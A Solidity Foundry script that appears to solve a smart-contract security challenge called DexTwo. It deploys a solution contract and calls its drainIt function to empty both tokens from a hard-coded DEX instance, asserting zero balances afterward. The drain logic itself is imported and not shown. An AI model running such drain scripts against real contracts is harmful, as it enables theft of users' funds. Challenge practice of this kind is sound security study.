// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { IDexTwo } from "./IDexTwo.sol";
import { DexTwoSolution } from "./DexTwoSolution.sol";

contract DexTwoScript is Script {

    IDexTwo dex;
    address instanceAddress = 0x62bDbe73427e419dee85335b2F4207813eAb1ada;
    address token1;
    address token2;


    function setUp() public {
        dex = IDexTwo(instanceAddress);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function run() public {
        vm.startBroadcast();
        DexTwoSolution dexSolution = new DexTwoSolution();

        dexSolution.drainIt(dex, true);
        assert(dex.balanceOf(token1, address(dex)) == 0);

        dexSolution.drainIt(dex, false);
        assert(dex.balanceOf(token2, address(dex)) == 0);

        vm.stopBroadcast();
    }
}
